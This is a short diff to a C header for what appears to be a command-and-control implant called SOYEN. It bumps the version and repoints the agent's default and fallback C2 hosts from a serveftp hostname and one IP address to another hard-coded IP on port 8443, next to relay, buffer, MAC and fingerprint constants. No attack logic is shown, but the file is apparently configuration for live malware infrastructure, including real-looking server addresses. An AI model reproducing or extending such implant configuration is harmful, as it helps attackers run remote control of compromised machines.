@@ -10,8 +10,8 @@ extern volatile bool ph_agent_is_busy;
 
 #define SOYEN_VERSION_MAJOR 1
 #define SOYEN_VERSION_MINOR 0
-#define SOYEN_VERSION_PATCH 0
-#define SOYEN_VERSION_STRING "v1.0.0-stable"
+#define SOYEN_VERSION_PATCH 1
+#define SOYEN_VERSION_STRING "v1.0.1-stable"
 
 #define PH_MAX_RELAYS 5
 #define PH_BUFFER_SIZE 4096
@@ -20,9 +20,9 @@ extern volatile bool ph_agent_is_busy;
 #define PH_MAC_SIZE 16
 #define PH_FINGERPRINT_SIZE 16
 
-#define DEFAULT_C2_PORT 443
-#define DEFAULT_C2_HOST "oyen.serveftp.com"
-#define FALLBACK_C2_HOST "13.213.138.250"
+#define DEFAULT_C2_PORT 8443
+#define DEFAULT_C2_HOST "116.202.105.253"
+#define FALLBACK_C2_HOST "116.202.105.253"
 
 #define PH_OK 0
 #define PH_ERR_NULL_PTR -1
